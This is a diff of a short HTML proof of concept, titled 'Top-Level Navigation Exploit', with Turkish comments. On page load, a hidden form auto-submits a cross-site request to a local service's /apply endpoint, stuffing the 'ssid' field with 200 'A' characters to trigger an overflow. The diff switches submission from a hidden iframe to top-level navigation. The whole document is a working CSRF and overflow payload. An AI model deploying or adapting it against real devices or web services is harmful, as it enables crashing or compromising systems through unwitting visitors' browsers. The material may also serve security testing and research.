@@ -1,31 +1,26 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Test Page</title>
+  <title>Top-Level Navigation Exploit</title>
 </head>
 <body>
-  <h2>Test web sayfası</h2>
-  <iframe src="http://127.0.0.1:5000/">
-  <iframe src="http://localhost:5000/">
-  <iframe name="hiddenFrame" style="display:none;"></iframe>
+  <h2>Sayfa Yükleniyor...</h2>
 
-  <!-- CSRF form -->
-  <form id="csrfForm"
-        action="http://127.0.0.1:5000/apply"
-        method="POST"
-        target="hiddenFrame"
+  <form id="csrfForm" 
+        action="http://127.0.0.1:5000/apply" 
+        method="POST" 
+        target="_top" 
         style="display:none;">
     <input type="hidden" name="ssid" id="payload">
   </form>
 
   <script>
-    // overflow tetiklemek için payload
+    // overflow example
     var payload = "A".repeat(200);
-
     document.getElementById("payload").value = payload;
 
-    // sayfa yüklenince otomatik gönder
+    // form submit
     window.onload = function() {
       document.getElementById("csrfForm").submit();
     };
